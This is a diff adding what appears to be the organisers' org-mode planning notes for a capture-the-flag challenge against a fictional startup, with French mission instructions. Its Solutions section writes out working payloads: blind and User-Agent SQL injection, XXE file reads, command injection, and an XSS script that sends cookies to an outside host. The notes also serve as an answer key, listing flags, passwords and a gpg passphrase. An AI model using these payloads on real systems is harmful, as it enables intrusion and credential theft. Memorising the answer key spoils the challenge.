@@ -1,0 +1,127 @@
+* Compagnies
+** Startup 1 — WTIIaaS
+   - What Time Is It as a Service
+   - Interface pour avoir l'heure
+*** Flags
+    - Trouver la liste de email des employés pour du spear phishing
+      - Il faut écrire un script de parsing
+    - 
+    
+** Startup 2 — Dawg
+   - Comme Bro dans Silicon Valley
+   - Les users peuvent payer pour envoyer des « Super Dawg »
+     - Et donc, carte de crédits disponibles
+
+* Solutions
+** DONE Blind SQL injection API key leak
+   CLOSED: [2017-02-25 Sat 01:12]
+   <key>' or (5=substr((select key_guid from apikeys limit 1,1),2,1) and sleep(1)) #</key>
+** DONE XXE
+   CLOSED: [2017-02-25 Sat 01:12]
+   In the API, free action `getTime' is vulnerable to XXE
+<?xml version="1.0"?>
+ <!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/api/api.php" >]>
+<WTIIaaS>
+  <identity>
+    <key>&xxe;</key>
+  </identity>
+  
+  <query action="getTime"/>
+</WTIIaaS>
+        
+** DONE RCE (Command injection) — Requires premium API key to have leaked beforehand, possible through various means
+   CLOSED: [2017-02-25 Sat 01:12]
+   In the API, premium action `getTimeWithFormat' is vulnerable to a command injection in the `format' field
+<?xml version="1.0"?>
+<WTIIaaS>
+  <identity>
+    <key>85922064</key>
+  </identity>
+  
+  <query action="getTimeWithFormat" format='%m";id;f="' />
+</WTIIaaS>
+
+** DONE Password dump
+   CLOSED: [2017-02-25 Sat 01:12]
+| Christia | Shore | shore.christia@wtiiaas.csg | f6432274349b5cb93433f8ed886a3f37 | winter |
+Password reuse on pastebin, indexed @ http://pastebin.com/EFxqS501, uploaded Fri Feb 24 21:19:26 EST 2017
+One of the ways to get to the intranet
+
+** DONE INSERT SQLi in User-Agent ("logging" mechanism)
+   CLOSED: [2017-02-25 Sat 01:13]
+*** POC
+   User-Agent: ' or extractvalue(1,concat(0x7e,(SELECT * from flag limit 0,1))) or '
+   
+   CSG_SomeThingsAreStrange
+*** SQL login → logging:JF8KI4iYQWNbjWtn
+
+** DONE Login as the CEO
+   CLOSED: [2017-03-01 Wed 23:14]
+*** Need PoC
+    <img id=f src=x /><script>var elem=document.getElementById('f');elem.src="http://192.168.0.199:8080/"+document.cookie;</script>
+** In Process Extract the banking info from /home/sysadmin/banking.txt.pgp
+   From a RCE, proceed to privilege escalate and extract the key from .bash_history
+*** Decrypted file content
+    Bank account
+    ------------
+    SWIFT/BIC: FLAG-US-35-A9F
+    Password : HS9;~7HP9P@tYm;8nvo[|mL;:D%BwUh5-X'0!v%I
+    
+* Todos
+** TODO Make mysql start automatically
+** TODO Fix images in team (CFO/CTO)
+** TODO Make API documentation in HTML
+** TBD Make employees.php page
+** DONE Index a database dump [identitygenerator.py] → 
+   CLOSED: [2017-02-24 Fri 21:18]
+** DONE Make intranet login
+   CLOSED: [2017-02-25 Sat 00:21]
+** DONE Add User-Agent sql injection
+   CLOSED: [2017-02-25 Sat 01:10]
+** DONE Implement a messaging system
+   CLOSED: [2017-02-25 Sat 18:11]
+** Implement a XSS bot for the CEO's account
+** WONTFIX Make the instructions HTML
+** Privilege escalation from RCE
+   Bash crontab running as sysadmin, banking file is owned by sysadmin
+** DONE Generate PGP file with banking info
+   CLOSED: [2017-03-01 Wed 22:13]
+*** Command
+    $ gpg --batch --yes --passphrase "@\!YOUcantGUESSthis#@\!" --output banking.txt.pgp --symmetric banking.txt
+** In Process Clean database before export
+** DONE Make app use dedicated SQL user (nonroot)
+   CLOSED: [2017-03-02 Thu 00:47]
+** TODO Fix Dockerfile
+** TODO Modify root password from ENV variable that will be set when container is RUN
+* Instructions
+Camarades, l'heure est grave. Les écrits du camarade Mao s'avèrent véridique: l'impérialisme de l'Ouest prend notre patrie en otage! Voilà pourquoi nous avons créés une unité super-méga-secrète qui nous permettera de partir en cyber-guerre contre ces américains assoiffés de profit! Ces jeunes programmeurs milliardaires de 20 ans causent un embarras incomensurable à la patrie, nous nous devons de lutter!
+
+Votre mission est de vous infiltrer dans le parc informatique d'une startup « high-tech » américaine et d'exfiltrer un maximum d'information. Cette informatoin sera ensuite relayée au politburo du Comité central du parti Communiste.
+
+Vos tâches:
+- Obtenir la liste complète des employés
+  - employees.txt
+  - Nom, prénom, password
+    
+- Trouver le mot de passe du CEO
+  - CEO-pass.txt
+  - Mot de passe en clair, hashé = moitié des points
+    
+- Obtenir de l'exécution de code sur le serveur web
+  - code-exec.txt
+    - Instruction pour reproduire l'exécution de code (quelques lignes avec preuve de concept (PoC))
+    
+- Obtenir 
+  
+- Obtenir les privilèges `root' sur le serveur
+  - Remise: rootwriteup.txt
+
+- Quelques flags sont cachés sur le serveur.
+  - flags.txt
+    - Format: CSG_[a-zA-Z]+
+
+  et votre patrie a besoin de vous afin de regagner du terrain sur l'économie mondiale. Ces damnés capitalistes de l'ouest nous mennent une lutte d'innovation sans relâche et semblent tous être  américains 
+
+ votre patrie a besoin de vous. 
